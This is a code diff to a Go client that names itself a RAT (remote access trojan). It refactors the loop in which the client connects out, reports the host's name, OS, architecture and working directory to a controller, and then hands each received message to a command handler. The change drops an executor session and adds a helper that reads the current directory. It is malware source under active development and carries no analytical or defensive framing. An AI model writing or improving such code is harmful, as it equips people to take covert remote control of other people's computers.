@@ -7,7 +7,6 @@ import (
 	"time"
 
 	"client-go/config"
-	"client-go/executor"
 	"client-go/handler"
 	"client-go/protocol"
 )
@@ -27,29 +26,28 @@ func (c *Client) Run() {
 		}
 
 		sock := protocol.NewRATSocket(conn)
-		clientID := hostname()
-		session := executor.NewSession(sock, clientID)
 
-		_ = sock.Send(map[string]interface{}{
-			"type":             "info",
-			"id":               clientID,
-			"os_type":          runtime.GOOS,
-			"os_ver":           runtime.GOARCH,
-			"hostname":         hostname(),
-			"cwd":              session.Cwd,
-			"integrity":        "unknown",
-			"command_manifest": []interface{}{},
+		// send full info (fix: server list needs this)
+		sock.Send(map[string]interface{}{
+			"type":     "info",
+			"id":       hostname(),
+			"os_type":  runtime.GOOS,
+			"os_ver":   runtime.GOARCH,
+			"hostname": hostname(),
+			"cwd":      cwd(),
+			"integrity": "unknown",
+			"command_manifest": []interface{}{}, // keep field
 			"system_paths":     []interface{}{},
 		})
 
 		for {
 			msg, err := sock.Recv()
 			if err != nil {
-				_ = conn.Close()
+				conn.Close()
 				break
 			}
 
-			handler.Handle(session, msg)
+			handler.Handle(sock, msg)
 		}
 	}
 }
@@ -57,4 +55,9 @@ func (c *Client) Run() {
 func hostname() string {
 	h, _ := os.Hostname()
 	return h
+}
+
+func cwd() string {
+	d, _ := os.Getwd()
+	return d
 }
